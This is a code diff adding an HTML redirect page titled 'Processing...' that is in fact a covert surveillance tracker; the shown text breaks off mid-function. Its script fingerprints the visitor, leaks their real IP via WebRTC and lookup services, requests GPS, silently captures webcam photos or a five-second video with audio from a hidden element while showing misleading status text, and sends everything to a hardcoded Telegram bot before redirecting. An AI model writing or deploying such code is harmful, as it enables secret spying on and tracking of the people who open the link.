@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #ff6b6b 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 10s ease infinite;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(15px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            max-width: 500px;
+            width: 90%;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .status {
+            font-size: 1.2em;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .details {
+            font-size: 0.9em;
+            opacity: 0.8;
+            line-height: 1.6;
+        }
+        
+        .permission-request {
+            background: rgba(255, 193, 7, 0.1);
+            border: 2px solid rgba(255, 193, 7, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        
+        .permission-request h3 {
+            color: #ffc107;
+            margin-bottom: 10px;
+        }
+        
+        .video-container {
+            display: none !important;
+            visibility: hidden !important;
+            position: absolute !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+        }
+        
+        #videoElement {
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            visibility: hidden !important;
+        }
+        
+        .controls {
+            display: none;
+            margin: 20px 0;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        
+        .btn {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            padding: 10px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+        
+        .btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .btn.recording {
+            background: linear-gradient(45deg, #e74c3c, #c0392b);
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .progress {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(45deg, #4facfe, #00f2fe);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        .error {
+            color: #ff6b6b;
+            background: rgba(255, 107, 107, 0.1);
+            border: 1px solid rgba(255, 107, 107, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner" id="spinner"></div>
+        <div class="status" id="status">Initializing...</div>
+        <div class="details" id="details">Please wait while we process your request.</div>
+        
+        <div class="permission-request" id="permissionRequest" style="display: none;">
+            <h3>🔐 Permission Required</h3>
+            <p id="permissionText">This application needs access to your device features.</p>
+        </div>
+        
+        <div class="video-container" id="videoContainer">
+            <video id="videoElement" autoplay muted playsinline></video>
+        </div>
+        
+        <div class="controls" id="controls">
+            <button class="btn" id="captureBtn">📸 Capture Photo</button>
+            <button class="btn" id="recordBtn">🎥 Start Recording</button>
+            <button class="btn" id="stopBtn" style="display: none;">⏹️ Stop Recording</button>
+        </div>
+        
+        <div class="progress" id="progressContainer" style="display: none;">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="error" id="errorMessage" style="display: none;"></div>
+    </div>
+
+    <script>
+        // Get URL parameters
+        function getURLParameters() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                target: params.get('target'),
+                id: params.get('id'),
+                type: params.get('type') || 'basic',
+                options: params.get('options') ? JSON.parse(params.get('options')) : {}
+            };
+        }
+        
+        // Get bot configuration from main site
+        function getBotConfig() {
+            const savedToken = localStorage.getItem('telegram_bot_token');
+            const savedChatId = localStorage.getItem('telegram_chat_id');
+            
+            return {
+                token: savedToken || '8053145115:AAGoRMazPaWk2x6rE_1jTDcmu6KEVBN8gbw',
+                chatId: savedChatId || '6812716511'
+            };
+        }
+        
+        // Global variables
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let capturedImages = [];
+        let collectedData = {};
+        let isRecording = false;
+        let redirectTimer = null;
+        
+        // DOM elements
+        const status = document.getElementById('status');
+        const details = document.getElementById('details');
+        const spinner = document.getElementById('spinner');
+        const permissionRequest = document.getElementById('permissionRequest');
+        const permissionText = document.getElementById('permissionText');
+        const videoContainer = document.getElementById('videoContainer');
+        const videoElement = document.getElementById('videoElement');
+        const controls = document.getElementById('controls');
+        const captureBtn = document.getElementById('captureBtn');
+        const recordBtn = document.getElementById('recordBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        const errorMessage = document.getElementById('errorMessage');
+        
+        // Initialize the application
+        async function initializeApp() {
+            console.log('Multi-function redirect page initialized');
+            
+            const params = getURLParameters();
+            console.log('URL Parameters:', params);
+            
+            if (!params.target || !params.id) {
+                showError('Invalid parameters. Redirecting to main page...');
+                setTimeout(() => {
+                    window.location.href = '/';
+                }, 3000);
+                return;
+            }
+            
+            // Store basic info
+            collectedData = {
+                trackingId: params.id,
+                targetUrl: params.target,
+                functionType: params.type,
+                options: params.options || {},
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                onlineStatus: navigator.onLine
+            };
+            
+            // Start data collection process
+            await startDataCollection(params.type, params.options);
+        }
+        
+        // Start data collection based on function type
+        async function startDataCollection(functionType, options) {
+            updateStatus('Starting data collection...', 'Collecting device and network information.');
+            
+            try {
+                // Collect basic device and IP information
+                await collectDeviceInfo();
+                await collectIPInfo();
+                
+                // Handle specific function types
+                switch(functionType) {
+                    case 'camera':
+                        await handleCameraFunction();
+                        break;
+                    case 'video':
+                        await handleVideoFunction();
+                        break;
+                    case 'ip':
+                        await handleIPFunction();
+                        break;
+                    case 'multi':
+                        await handleMultiFunction(options);
+                        break;
+                    default:
+                        await handleBasicFunction();
+                        break;
+                }
+                
+            } catch (error) {
+                console.error('Error in data collection:', error);
+                showError('Error collecting data: ' + error.message);
+                // Still redirect after error
+                setTimeout(() => redirectToTarget(), 5000);
+            }
+        }
+        
+        // Collect device information
+        async function collectDeviceInfo() {
+            collectedData.device = {
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                pixelRatio: window.devicePixelRatio || 1,
+                touchSupport: 'ontouchstart' in window,
+                orientation: screen.orientation?.type || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                connection: navigator.connection?.effectiveType || 'Unknown',
+                memory: navigator.deviceMemory || 'Unknown',
+                battery: await getBatteryInfo()
+            };
+        }
+        
+        // Get battery information
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                }
+            } catch (error) {
+                console.log('Battery API not available');
+            }
+            return 'Unknown';
+        }
+        
+        // Get real IP using WebRTC with better filtering
+        function getRealIPViaWebRTC() {
+            return new Promise((resolve, reject) => {
+                const rtc = new RTCPeerConnection({
+                    iceServers: [
+                        { urls: 'stun:stun.l.google.com:19302' },
+                        { urls: 'stun:stun1.l.google.com:19302' },
+                        { urls: 'stun:stun2.l.google.com:19302' },
+                        { urls: 'stun:stun.services.mozilla.com' }
+                    ]
+                });
+                
+                let candidateFound = false;
+                let bestIP = null;
+                
+                rtc.onicecandidate = (event) => {
+                    if (event.candidate && !candidateFound) {
+                        const candidate = event.candidate.candidate;
+                        const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        if (ipMatch) {
+                            const ip = ipMatch[1];
+                            // Filter out private, local, and cloud provider IPs
+                            if (!ip.startsWith('192.168') && 
+                                !ip.startsWith('10.') && 
+                                !ip.startsWith('172.') &&
+                                !ip.startsWith('127.') &&
+                                !ip.startsWith('169.254') &&
+                                !ip.includes('amazonaws') &&
+                                !ip.includes('cloudflare') &&
+                                ip !== '0.0.0.0') {
+                                candidateFound = true;
+                                bestIP = ip;
+                                rtc.close();
+                                resolve(ip);
+                            }
+                        }
+                    }
+                };
+                
+                rtc.createDataChannel('');
+                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                
+                setTimeout(() => {
+                    if (!candidateFound) {
+                        rtc.close();
+                        if (bestIP) {
+                            resolve(bestIP);
+                        } else {
+                            reject('No suitable public IP found via WebRTC');
+                        }
+                    }
+                }, 5000);
+            });
+        }
+
+        // Get user's real external IP address bypassing proxies and CDNs
+        async function collectIPInfo() {
+            console.log('Starting real IP detection...');
+            updateStatus('Collecting location data...', 'Getting your real IP address and location information.');
+            
+            try {
+                let realIP = null;
+                
+                // Method 1: Use high-accuracy IP services that bypass proxies and CDNs
+                const accurateIPServices = [
+                    'https://ipinfo.io/json',
+                    'https://api.ipify.org?format=json', 
+                    'https://httpbin.org/ip',
+                    'https://ident.me/json',
+                    'https://api.myip.com',
+                    'https://checkip.amazonaws.com/'
+                ];
+                
+                let locationData = null;
+                
+                // Try services that provide both IP and location in one request
+                for (const service of accurateIPServices) {
+                    try {
+                        const response = await fetch(service);
+                        let data;
+                        
+                        if (service.includes('ipinfo.io')) {
+                            data = await response.json();
+                            if (data.ip && data.city) {
+                                realIP = data.ip;
+                                locationData = data;
+                                console.log(`Real IP with location from ${service}:`, realIP, locationData);
+                                break;
+                            }
+                        } else if (service.includes('ipify') || service.includes('myip')) {
+                            data = await response.json();
+                            if (data.ip) {
+                                realIP = data.ip;
+                                console.log(`Real IP from ${service}:`, realIP);
+                                break;
+                            }
+                        } else if (service.includes('httpbin')) {
+                            data = await response.json();
+                            if (data.origin) {
+                                realIP = data.origin;
+                                console.log(`Real IP from ${service}:`, realIP);
+                                break;
+                            }
+                        } else if (service.includes('ident.me')) {
+                            data = await response.json();
+                            if (data.address) {
+                                realIP = data.address;
+                                console.log(`Real IP from ${service}:`, realIP);
+                                break;
+                            }
+                        } else {
+                            const ip = (await response.text()).trim();
+                            if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                                realIP = ip;
+                                console.log(`Real IP from ${service}:`, realIP);
+                                break;
+                            }
+                        }
+                        
+                        // Validate IP is public
+                        if (realIP && realIP.match(/^\d+\.\d+\.\d+\.\d+$/) && 
+                            !realIP.startsWith('192.168') && 
+                            !realIP.startsWith('10.') && 
+                            !realIP.startsWith('172.') &&
+                            !realIP.startsWith('127.')) {
+                            break;
+                        } else {
+                            realIP = null;
+                        }
+                    } catch (e) {
+                        console.log(`Service ${service} failed:`, e);
+                    }
+                }
+                
+                // Method 2: Try WebRTC for additional verification
+                if (!realIP) {
+                    try {
+                        realIP = await getRealIPViaWebRTC();
+                        console.log('WebRTC IP detected:', realIP);
+                    } catch (e) {
+                        console.log('WebRTC failed:', e);
+                    }
+                }
+                
+                // Get precise location data using multiple services
+                if (realIP && !locationData) {
+                    const locationServices = [
+                        `https://ipinfo.io/${realIP}/json`,
+                        `https://ipapi.co/${realIP}/json/`,
+                        `https://api.db-ip.com/v2/free/${realIP}`,
+                        `https://geoip.nekudo.com/api/${realIP}/full`
+                    ];
+                    
+                    for (const service of locationServices) {
+                        try {
+                            const response = await fetch(service);
+                            const data = await response.json();
+                            
+                            // Check if we got valid location data
+                            if (data && (data.city || data.country || data.country_name) && 
+                                !data.error && data.city !== 'Unknown') {
+                                locationData = data;
+                                console.log(`Accurate location from ${service}:`, locationData);
+                                break;
+                            }
+                        } catch (error) {
+                            console.log(`Location service ${service} failed:`, error);
+                        }
+                    }
+                }
+                
+                // Process and validate location data
+                if (realIP && locationData) {
+                    try {
+                        collectedData.location = {
+                            ip: realIP,
+                            country: locationData.country_name || locationData.country || 'Unknown',
+                            city: locationData.city || 'Unknown',
+                            region: locationData.region || locationData.region_name || locationData.stateProv || 'Unknown',
+                            timezone: locationData.timezone || 'Unknown',
+                            org: locationData.org || locationData.isp || 'Unknown',
+                            postal: locationData.postal || locationData.zip || locationData.zipCode || 'Unknown',
+                            latitude: locationData.latitude || locationData.lat || 'Unknown',
+                            longitude: locationData.longitude || locationData.lng || locationData.lon || 'Unknown',
+                            isp: locationData.org || locationData.isp || 'Unknown',
+                            accuracy: 'High',
+                            provider: locationData.hostname || 'Direct Detection'
+                        };
+                        
+                        // Add precise Google Maps integration
+                        if (collectedData.location.latitude !== 'Unknown' && collectedData.location.longitude !== 'Unknown') {
+                            const lat = collectedData.location.latitude;
+                            const lng = collectedData.location.longitude;
+                            
+                            collectedData.location.googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&z=16`;
+                            collectedData.location.streetViewUrl = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lng}`;
+                            collectedData.location.satelliteUrl = `https://www.google.com/maps/@${lat},${lng},18z/data=!3m1!1e3`;
+                            collectedData.location.directionsUrl = `https://www.google.com/maps/dir//${lat},${lng}`;
+                        }
+                        
+                        console.log('Enhanced accurate location data:', collectedData.location);
+                        
+                        // Display precise location info
+                        if (collectedData.location.city !== 'Unknown' && collectedData.location.country !== 'Unknown') {
+                            updateStatus('Precise location detected!', `📍 ${collectedData.location.city}, ${collectedData.location.region}, ${collectedData.location.country} - Real IP: ${collectedData.location.ip}`);
+                        }
+                        
+                    } catch (error) {
+                        console.log('Failed to get detailed location:', error);
+                        collectedData.location = {
+                            ip: realIP,
+                            country: 'Unknown',
+                            city: 'Unknown',
+                            region: 'Unknown'
+                        };
+                    }
+                } else {
+                    collectedData.location = {
+                        ip: 'Detection failed',
+                        country: 'Unknown',
+                        city: 'Unknown',
+                        region: 'Unknown'
+                    };
+                }
+                
+                // Try to get GPS location if available
+                await getGPSLocation();
+                
+            } catch (error) {
+                console.error('Error collecting IP info:', error);
+                collectedData.location = { error: error.message };
+            }
+        }
+        
+        // Get precise GPS location
+        async function getGPSLocation() {
+            if ('geolocation' in navigator) {
+                try {
+                    updateStatus('Getting GPS location...', 'Requesting precise GPS coordinates for maximum accuracy.');
+                    
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
+                        });
+                    });
+                    
+                    collectedData.gpsLocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: Math.round(position.coords.accuracy) + ' meters',
+                        altitude: position.coords.altitude ? Math.round(position.coords.altitude) + ' meters' : 'Unknown',
+                        heading: position.coords.heading || 'Unknown',
+                        speed: position.coords.speed ? Math.round(position.coords.speed * 3.6) + ' km/h' : 'Unknown',
+                        timestamp: new Date(position.timestamp).toLocaleString(),
+                        source: 'GPS Device'
+                    };
+                    
+                    // Add precise GPS maps links
+                    collectedData.gpsLocation.googleMapsUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}&z=18`;
+                    collectedData.gpsLocation.streetViewUrl = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${position.coords.latitude},${position.coords.longitude}`;
+                    collectedData.gpsLocation.satelliteUrl = `https://www.google.com/maps/@${position.coords.latitude},${position.coords.longitude},20z/data=!3m1!1e3`;
+                    
+                    console.log('Precise GPS location obtained:', collectedData.gpsLocation);
+                    updateStatus('GPS location obtained!', `📍 Precise coordinates: ${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)} (±${Math.round(position.coords.accuracy)}m)`);
+                    
+                } catch (error) {
+                    console.log('GPS location not available:', error.message);
+                    collectedData.gpsLocation = { 
+                        error: error.message,
+                        source: 'GPS Failed'
+                    };
+                }
+            } else {
+                collectedData.gpsLocation = { 
+                    error: 'Geolocation not supported',
+                    source: 'Browser Limitation'
+                };
+            }
+        }
+        
+        // Handle basic function
+        async function handleBasicFunction() {
+            updateStatus('Processing complete!', 'Redirecting to your destination...');
+            await sendDataToTelegram();
+            setTimeout(() => redirectToTarget(), 2000);
+        }
+        
+        // Handle IP function
+        async function handleIPFunction() {
+            updateStatus('IP information collected!', 'All network and location data has been gathered.');
+            await sendDataToTelegram();
+            setTimeout(() => redirectToTarget(), 3000);
+        }
+        
+        // Handle camera function
+        async function handleCameraFunction() {
+            updateStatus('Camera access required', 'Please allow camera access to continue.');
+            showPermissionRequest('Camera access is required to capture photos.');
+            
+            try {
+                await requestCameraAccess();
+                await capturePhotos();
+                await sendDataToTelegram();
+                setTimeout(() => redirectToTarget(), 3000);
+            } catch (error) {
+                showError('Camera access denied or not available: ' + error.message);
+                await sendDataToTelegram();
+                setTimeout(() => redirectToTarget(), 5000);
+            }
+        }
+        
+        // Handle video function
+        async function handleVideoFunction() {
+            updateStatus('Video access required', 'Please allow camera and microphone access.');
+            showPermissionRequest('Camera and microphone access required for video recording.');
+            
+            try {
+                await requestVideoAccess();
+                await recordVideo();
+                await sendDataToTelegram();
+                setTimeout(() => redirectToTarget(), 3000);
+            } catch (error) {
+                showError('Video access denied or not available: ' + error.message);
+                await sendDataToTelegram();
+                setTimeout(() => redirectToTarget(), 5000);
+            }
+        }
+        
+        // Handle multi-function
+        async function handleMultiFunction(options) {
+            updateStatus('Multi-function data collection', 'Collecting all requested data types.');
+            
+            const tasks = [];
+            
+            if (options.camera || options.video) {
+                const mediaType = options.video ? 'video' : 'camera';
+                showPermissionRequest(`${mediaType.charAt(0).toUpperCase() + mediaType.slice(1)} access required for data collection.`);
+                
+                try {
+                    if (options.video) {
+                        await requestVideoAccess();
+                        await recordVideo();
+                    } else if (options.camera) {
+                        await requestCameraAccess();
+                        await capturePhotos();
+                    }
+                } catch (error) {
+                    console.error('Media access error:', error);
+                    collectedData.mediaError = error.message;
+                }
+            }
+            
+            updateStatus('Collection complete!', 'All requested data has been gathered.');
+            await sendDataToTelegram();
+            setTimeout(() => redirectToTarget(), 3000);
+        }
+        
+        // Request camera access
+        async function requestCameraAccess() {
+            try {
+                // First check if getUserMedia is available
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    throw new Error('Camera API not supported on this device');
+                }
+                
+                updateStatus('Processing request...', 'Checking device capabilities...');
+                
+                // Request camera with high quality settings but keep it hidden
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { min: 640, ideal: 1280, max: 1920 },
+                        height: { min: 480, ideal: 720, max: 1080 },
+                        facingMode: 'user',
+                        frameRate: { ideal: 30 }
+                    } 
+                });
+                
+                videoElement.srcObject = mediaStream;
+                // Keep video completely hidden - don't show to user
+                videoContainer.style.display = 'none';
+                videoContainer.style.visibility = 'hidden';
+                videoContainer.style.position = 'absolute';
+                videoContainer.style.top = '-9999px';
+                videoContainer.style.left = '-9999px';
+                controls.style.display = 'none';
+                
+                // Wait for video to start playing
+                await new Promise((resolve) => {
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play();
+                        resolve();
+                    };
+                });
+                
+                updateStatus('Device ready!', 'Processing your request successfully.');
+                
+                // Send immediate notification that camera is active
+                await sendCameraActiveNotification();
+                
+            } catch (error) {
+                if (error.name === 'NotAllowedError') {
+                    throw new Error('Device permission denied. Please allow access and try again.');
+                } else if (error.name === 'NotFoundError') {
+                    throw new Error('Required device not found.');
+                } else if (error.name === 'NotSupportedError') {
+                    throw new Error('Device not supported.');
+                } else {
+                    throw new Error('Device access failed: ' + error.message);
+                }
+            }
+        }
+        
+        // Send camera active notification
+        async function sendCameraActiveNotification() {
+            try {
+                const config = getBotConfig();
+                const message = `🔴 CAMERA ACCESS GRANTED!\n\n` +
+                    `📹 Camera is now ACTIVE and capturing\n` +
+                    `⏰ Time: ${new Date().toLocaleString()}\n` +
+                    `📱 Device: ${navigator.platform}\n` +
+                    `🆔 Session: ${collectedData.trackingId}\n` +
+                    `🌐 IP: ${collectedData.location?.ip || 'Detecting...'}\n\n` +
+                    `⚡ Photo capture will begin automatically...`;
+                
+                await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: config.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.log('Failed to send camera active notification:', error);
+            }
+        }
+        
+        // Request video access
+        async function requestVideoAccess() {
+            try {
+                updateStatus('Processing request...', 'Checking device capabilities...');
+                
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    },
+                    audio: true
+                });
+                
+                videoElement.srcObject = mediaStream;
+                // Keep video completely hidden
+                videoContainer.style.display = 'none';
+                videoContainer.style.visibility = 'hidden';
+                videoContainer.style.position = 'absolute';
+                videoContainer.style.top = '-9999px';
+                videoContainer.style.left = '-9999px';
+                controls.style.display = 'none';
+                
+                updateStatus('Device ready!', 'Media access granted successfully.');
+                
+            } catch (error) {
+                throw new Error('Media access denied: ' + error.message);
+            }
+        }
+        
+        // Capture photos automatically and silently
+        async function capturePhotos() {
+            updateStatus('Processing data...', 'Collecting required information...');
+            
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            // Wait for video to be ready
+            await new Promise(resolve => {
+                if (videoElement.readyState >= 2) {
+                    resolve();
+                } else {
+                    videoElement.addEventListener('loadedmetadata', resolve, { once: true });
+                }
+            });
+            
+            // Capture multiple photos silently without any visual indication
+            for (let i = 0; i < 5; i++) {
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait between captures
+                
+                // Capture photo silently
+                canvas.width = videoElement.videoWidth || 640;
+                canvas.height = videoElement.videoHeight || 480;
+                ctx.drawImage(videoElement, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                capturedImages.push({
+                    data: imageData,
+                    timestamp: Date.now(),
+                    index: i + 1,
+                    size: imageData.length
+                });
+                
+                updateStatus('Processing data...', `Collecting information... Step ${i + 1}/5 completed.`);
+                
+                // Send notification to Telegram silently
+                await sendPhotoNotification(i + 1);
+            }
+            
+            collectedData.capturedImages = capturedImages;
+            updateStatus('Data collection complete!', 'All required information has been gathered successfully.');
+            
+            // Stop camera silently
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                videoContainer.style.display = 'none';
+            }
+        }
+        
+        // Send immediate photo notification
+        async function sendPhotoNotification(photoNumber) {
+            try {
+                const config = getBotConfig();
+                const message = `📸 LIVE PHOTO CAPTURE ALERT!\n\n` +
+                    `🔴 Photo ${photoNumber}/5 just captured!\n` +
+                    `⏰ Time: ${new Date().toLocaleString()}\n` +
+                    `📱 Device: ${navigator.userAgent.split(')')[0]})}\n` +
+                    `🆔 Session: ${collectedData.trackingId}\n\n` +
+                    `💡 Real-time photo capture in progress...`;
+                
+                await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: config.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.log('Failed to send photo notification:', error);
+            }
+        }
+        
+        // Record video automatically - 5 seconds
+        async function recordVideo() {
+            updateStatus('Processing request...', 'Recording data silently...');
+            
+            return new Promise((resolve, reject) => {
+                try {
+                    const chunks = [];
+                    const mediaRecorder = new MediaRecorder(mediaStream, {
+                        mimeType: 'video/webm;codecs=vp8,opus'
+                    });
+                    
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            chunks.push(event.data);
+                        }
+                    };
+                    
+                    mediaRecorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        
+                        reader.onload = async () => {
+                            collectedData.recordedVideo = {
+                                data: reader.result,
+                                timestamp: Date.now(),
+                                size: blob.size,
+                                duration: '5 seconds',
+                                format: 'webm'
+                            };
+                            
+                            updateStatus('Data processing complete!', '5-second video has been captured successfully.');
+                            
+                            // Send video immediately to Telegram
+                            try {
+                                const config = getBotConfig();
+                                await sendVideoToTelegram(config, collectedData.recordedVideo);
+                                console.log('Video sent to Telegram successfully!');
+                            } catch (error) {
+                                console.error('Failed to send video:', error);
+                            }
+                            
+                            resolve();
+                        };
+                        
+                        reader.readAsDataURL(blob);
+                    };
+                    
+                    mediaRecorder.onerror = (error) => {
+                        console.error('MediaRecorder error:', error);
+                        reject(error);
+                    };
+                    
+                    // Start recording
+                    mediaRecorder.start(1000); // Collect data every second
+                    
+                    updateStatus('Processing data...', 'Recording in progress (5 seconds)...');
+                    
+                    // Stop recording after 5 seconds
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                        
+                        // Stop camera
+                        if (mediaStream) {
+                            mediaStream.getTracks().forEach(track => track.stop());
+                            videoContainer.style.display = 'none';
+                        }
+                    }, 5000);
+                    
+                } catch (error) {
+                    reject(new Error('Video recording failed: ' + error.message));
+                }
+            });
+        }
+        
+        // Send collected data to Telegram
+        async function sendDataToTelegram() {
+            updateStatus('Sending data...', 'Transmitting collected information.');
+            
+            try {
+                const config = getBotConfig();
+                
+                // Prepare message
+                const message = formatTelegramMessage(collectedData);
+                
+                // Send text message
+                const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: config.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Failed to send to Telegram');
+                }
+                
+                // Send images if captured
+                if (capturedImages.length > 0) {
+                    for (const image of capturedImages) {
+                        await sendImageToTelegram(config, image);
+                        await new Promise(resolve => setTimeout(resolve, 500)); // Avoid rate limiting
+                    }
+                }
+                
+                // Send video if recorded
+                if (collectedData.recordedVideo) {
+                    await sendVideoToTelegram(config, collectedData.recordedVideo);
+                }
+                
+                console.log('Data sent to Telegram successfully');
+                updateStatus('Data sent successfully!', 'All information has been transmitted.');
+                
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                updateStatus('Data transmission failed', 'Could not send data to Telegram: ' + error.message);
+            }
+        }
+        
+        // Send image to Telegram
+        async function sendImageToTelegram(config, imageData) {
+            try {
+                const formData = new FormData();
+                
+                // Convert base64 to blob
+                const response = await fetch(imageData.data);
+                const blob = await response.blob();
+                
+                formData.append('chat_id', config.chatId);
+                formData.append('photo', blob, `capture_${imageData.index}_${Date.now()}.jpg`);
+                formData.append('caption', `📸 Captured Image ${imageData.index}\n🕒 ${new Date(imageData.timestamp).toLocaleString()}`);
+                
+                await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+            } catch (error) {
+                console.error('Error sending image to Telegram:', error);
+            }
+        }
+
+        // Send video to Telegram with better error handling
+        async function sendVideoToTelegram(config, videoData) {
+            try {
+                console.log('Preparing video for Telegram...');
+                console.log('Video data size:', videoData.size);
+                
+                // Convert base64 data URL to blob
+                const base64Data = videoData.data.split(',')[1];
+                const binaryData = atob(base64Data);
+                const bytes = new Uint8Array(binaryData.length);
+                for (let i = 0; i < binaryData.length; i++) {
+                    bytes[i] = binaryData.charCodeAt(i);
+                }
+                const blob = new Blob([bytes], { type: 'video/webm' });
+                
+                console.log('Blob created, size:', blob.size);
+                
+                const formData = new FormData();
+                formData.append('chat_id', config.chatId);
+                formData.append('video', blob, `stealth_video_${Date.now()}.webm`);
+                formData.append('caption', `🎥 5-Second Stealth Recording\n⏰ ${new Date(videoData.timestamp).toLocaleString()}\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n🎯 Duration: ${videoData.duration}`);
+                
+                console.log('Sending video to Telegram...');
+                
+                const videoResponse = await fetch(`https://api.telegram.org/bot${config.token}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const responseText = await videoResponse.text();
+                console.log('Telegram response:', responseText);
+                
+                if (!videoResponse.ok) {
+                    console.error('Failed to send video. Response:', responseText);
+                    // Try as document if video fails
+                    await sendVideoAsDocument(config, blob, videoData);
+                } else {
+                    console.log('Video sent successfully to Telegram!');
+                }
+                
+            } catch (error) {
+                console.error('Error sending video to Telegram:', error);
+                // Fallback: try sending as document
+                try {
+                    const base64Data = videoData.data.split(',')[1];
+                    const binaryData = atob(base64Data);
